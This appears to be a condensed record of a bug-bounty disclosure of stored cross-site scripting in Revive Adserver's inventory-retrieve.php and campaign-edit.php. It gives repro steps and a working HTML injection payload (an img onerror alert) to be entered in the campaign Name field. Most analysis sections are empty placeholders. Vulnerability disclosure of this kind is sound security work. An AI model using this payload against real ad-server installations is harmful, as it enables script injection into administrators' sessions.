# Stored XSS on inventory-retrieve.php

## Metadata
- **Source:** HackerOne
- **Report:** 3399809 | https://hackerone.com/reports/3399809
- **Submitted:** 2025-10-25
- **Reporter:** lu3ky-13
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** CVE-2025-52667
- **Category:** web-api

## Summary
h1 team

i have found Cross-site Scripting (XSS) - Stored on inventory-retrieve.php and campaign-edit.php

steps here

1 go to Inventory --> Campaign ---> add payload in 	Name *
2 write any payload```><img src=x onerror=alert(document.domain)>```
4 open this http://localhost/ddf/revive-adserver-6.0.1/www/admin/inventory-retrieve.php?clientid=1
4 you see alert
{F4932943}

open this
http://localhost

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

h1 team

i have found Cross-site Scripting (XSS) - Stored on inventory-retrieve.php and campaign-edit.php

steps here

1 go to Inventory --> Campaign ---> add payload in 	Name *
2 write any payload```><img src=x onerror=alert(document.domain)>```
4 open this http://localhost/ddf/revive-adserver-6.0.1/www/admin/inventory-retrieve.php?clientid=1
4 you see alert
{F4932943}

open this
http://localhost/ddf/revive-adserver-6.0.1/www/admin/inventory-retrieve.php?clientid=1

{F4932944}

## Impact

Cross-site Scripting (XSS) - Stored on inventory-retrieve.php and campaign-edit.php

</details>

---
*Analysed by Claude on 2026-05-24*
